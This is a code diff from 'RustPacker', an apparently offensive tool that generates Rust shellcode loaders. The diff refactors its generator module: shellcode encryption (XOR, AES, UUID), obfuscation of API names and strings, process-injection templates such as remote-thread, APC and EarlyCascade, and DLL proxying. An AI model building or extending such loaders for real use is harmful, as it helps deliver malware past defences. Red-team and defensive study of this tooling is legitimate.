@@ -1,11 +1,10 @@
-use crate::aes::encrypt_aes;
-use crate::arg_parser::{Encryption, Execution, Format, Order};
-use crate::dll_proxy;
-use crate::pe_parser;
+//! Generator module for RustPacker
+//!
+//! This module handles the generation of Rust code for shellcode loaders.
+
+use crate::config::{Encryption, Execution, Format, Order};
+use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
 use crate::sandbox::build_sandbox;
-use crate::tools::{random_aes_iv, random_aes_key, random_u8, EncryptionOutput};
-use crate::uuid_enc::encrypt_uuid;
-use crate::xor::encrypt_xor;
 use fs_extra::dir::{copy, CopyOptions};
 use std::collections::HashMap;
 use std::fs::{self, OpenOptions};
@@ -13,29 +12,6 @@ use std::io::prelude::*;
 use std::path::{Path, PathBuf};
 use std::process::exit;
 use std::time::{SystemTime, UNIX_EPOCH};
-
-/// Obfuscate API function name using XOR with a key
-///
-/// # Arguments
-/// * `name` - The API function name to obfuscate
-/// * `key` - The XOR key to use
-///
-/// # Returns
-/// Obfuscated string representation of the API name
-fn obfuscate_api_name(name: &str, key: u8) -> String {
-    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
-    format!("[{}]", bytes.join(", "))
-}
-
-/// Generate a random non-zero key for API obfuscation
-fn non_zero_random_key() -> u8 {
-    loop {
-        let k = random_u8();
-        if k != 0 {
-            return k;
-        }
-    }
-}
 
 const OUTPUT_DIR: &str = "shared";
 const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
@@ -126,17 +102,8 @@ fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::E
 ///
 /// # Returns
 /// Path to the template directory
-fn template_path_for_execution(execution: &Execution) -> &'static Path {
-    match execution {
-        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
-        Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
-        Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
-        Execution::WinCreateRemoteThread => Path::new("templates/winCRT/."),
-        Execution::WinFiber => Path::new("templates/winFIBER/."),
-        Execution::NtFiber => Path::new("templates/ntFIBER/."),
-        Execution::SysFiber => Path::new("templates/sysFIBER/."),
-        Execution::EarlyCascade => Path::new("templates/ntEarlyCascade/."),
-    }
+fn template_path_for_execution(execution: &Execution) -> PathBuf {
+    PathBuf::from(format!("templates/{}/.", execution.template_name()))
 }
 
 /// Get the encrypted filename based on encryption method
@@ -162,54 +129,14 @@ fn encrypted_filename(encryption: &Encryption) -> &'static str {
 ///
 /// # Returns
 /// Tuple of (EncryptionOutput, include_path)
-fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, String) {
+fn build_encrypted_output(order: &Order, src_dir: &Path) -> (crate::encryption::EncryptionOutput, String) {
     let filename = encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
     let include_path = format!("\"{}\"", filename);
 
-    let output = match order.encryption {
-        Encryption::Xor => encrypt_xor(&order.shellcode_path, &path, non_zero_random_key()),
-        Encryption::Aes => encrypt_aes(
-            &order.shellcode_path,
-            &path,
-            &random_aes_key(),
-            &random_aes_iv(),
-        ),
-        Encryption::Uuid => encrypt_uuid(&order.shellcode_path, &path),
-    };
+    let output = crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption);
 
     (output, include_path)
-}
-
-/// Obfuscate a string for use in template code
-///
-/// # Arguments
-/// * `value` - The string to obfuscate
-///
-/// # Returns
-/// Obfuscated string expression
-fn obfuscate_string_for_template(value: &str) -> String {
-    // Use XOR obfuscation for all strings in templates
-    let (obfuscated, key) = crate::string_obfuscation::xor_obfuscate(value);
-    let bytes_lit: Vec<String> = obfuscated.iter().map(|b| format!("0x{:02x}", b)).collect();
-
-    // Generate a unique variable name based on the string
-    let var_name = format!("s_{}", generate_string_hash(value));
-
-    // Return the deobfuscation code
-    format!(
-        "let {} = [{}]\n    .iter()\n    .map(|b| *b ^ 0x{:02x})\n    .map(|b| b as char)\n    .collect::<String>();",
-        var_name, bytes_lit.join(", "), key
-    )
-}
-
-/// Generate a simple hash for string variable naming
-fn generate_string_hash(s: &str) -> u32 {
-    let mut hash: u32 = 5381;
-    for c in s.bytes() {
-        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
-    }
-    hash % 10000 // Keep it reasonable
 }
 
 /// Build all replacements for the template
@@ -432,7 +359,7 @@ fn proxy_module_insert_offset(existing: &str) -> usize {
 /// * `folder` - Output folder path
 fn apply_proxy(order: &Order, folder: &Path) {
     let proxy_path = order.proxy_dll.as_ref().unwrap();
-    let exports = pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
+    let exports = crate::pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
         eprintln!("[-] Failed to parse proxy DLL exports: {}", e);
         exit(1);
     });
@@ -441,8 +368,8 @@ fn apply_proxy(order: &Order, folder: &Path) {
         eprintln!("[-] Warning: proxy DLL has no exports");
     }
 
-    let stem = pe_parser::dll_stem(proxy_path);
-    let proxy_output = dll_proxy::generate_proxy(&exports, &stem);
+    let stem = crate::pe_parser::dll_stem(proxy_path);
+    let proxy_output = crate::dll_proxy::generate_proxy(&exports, &stem);
 
     let src_dir = folder.join("src");
     fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
@@ -477,7 +404,7 @@ pub fn assemble(order: Order) -> PathBuf {
 
     let template_path = template_path_for_execution(&order.execution);
     let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
-    copy_template(template_path, &folder).expect("Failed to copy template");
+    copy_template(&template_path, &folder).expect("Failed to copy template");
 
     let src_dir = folder.join("src");
     let main_rs = src_dir.join("main.rs");
@@ -504,6 +431,8 @@ pub fn assemble(order: Order) -> PathBuf {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::config::{Encryption, Execution, Format};
+    use std::path::PathBuf;
 
     #[test]
     fn test_build_dependencies_always_includes_litcrypt() {
@@ -515,33 +444,23 @@ mod tests {
     }
 
     #[test]
+    fn test_template_path_for_execution() {
+        let path = template_path_for_execution(&Execution::NtCreateRemoteThread);
+        assert!(path.to_string_lossy().contains("templates/ntCRT"));
+    }
+
+    #[test]
+    fn test_encrypted_filename() {
+        assert_eq!(encrypted_filename(&Encryption::Xor), "input.xor");
+        assert_eq!(encrypted_filename(&Encryption::Aes), "input.aes");
+        assert_eq!(encrypted_filename(&Encryption::Uuid), "input.uuid");
+    }
+
+    #[test]
     fn test_proxy_module_insert_offset_keeps_litcrypt_first() {
         let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
         let insert_at = proxy_module_insert_offset(source);
         assert!(source[..insert_at].contains("use_litcrypt!();"));
         assert!(source[insert_at..].starts_with('\n'));
-    }
-
-    #[test]
-    fn test_generate_string_hash() {
-        let hash1 = generate_string_hash("test");
-        let hash2 = generate_string_hash("test");
-        assert_eq!(hash1, hash2); // Same input = same hash
-
-        let hash3 = generate_string_hash("different");
-        // Different input should (probably) have different hash
-        // Note: This could theoretically fail due to hash collision, but extremely unlikely
-        assert_ne!(
-            hash1, hash3,
-            "Hash collision detected for test vs different"
-        );
-    }
-
-    #[test]
-    fn test_obfuscate_string_for_template() {
-        let obfuscated = obfuscate_string_for_template("notepad.exe");
-        assert!(obfuscated.contains("let s_"));
-        assert!(obfuscated.contains(".iter()"));
-        assert!(obfuscated.contains("^ 0x"));
     }
 }
